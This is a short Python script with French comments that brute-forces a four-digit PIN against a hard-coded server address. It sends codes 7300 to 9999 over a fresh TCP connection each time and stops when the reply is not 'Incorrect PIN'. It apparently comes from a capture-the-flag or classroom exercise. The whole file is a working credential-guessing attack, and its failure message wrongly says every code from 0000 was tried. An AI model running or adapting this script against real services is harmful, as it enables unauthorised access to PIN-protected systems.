import socket

server = "51.38.191.157"
port = 12345

trouve = False
for i in range(7300,10000):

    code = str(i)  #convertir le nombre en chaine de caractères
    code = code.zfill(4)

    ma_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ma_socket.connect((server, port))

    print("\rEnvoi du code :", code , end="")  #end sert à ne pas passer à la ligne après l'affichage du code

    ligne = ma_socket.recv(1024)

    a_envoyer = code + "\n" # on ajoute un retour à la ligne car le serveur attend un retour à la ligne pour valider le code
    ma_socket.sendall(a_envoyer.encode()) #cette ligne teste le code en l'envoyant au serveur

    reponse = ma_socket.recv(1024)
    
    # si le serveur répond autre chose que "Incorrect PIN", c'est qu'on a trouvé
    if reponse != b"Incorrect PIN\n":
        print("TROUVE ! le code est :", code)
        print("le serveur a répondu :", reponse)
        trouve = True
        break

if trouve == False:
    print("aucun code n'a marché entre 0000 et 9999")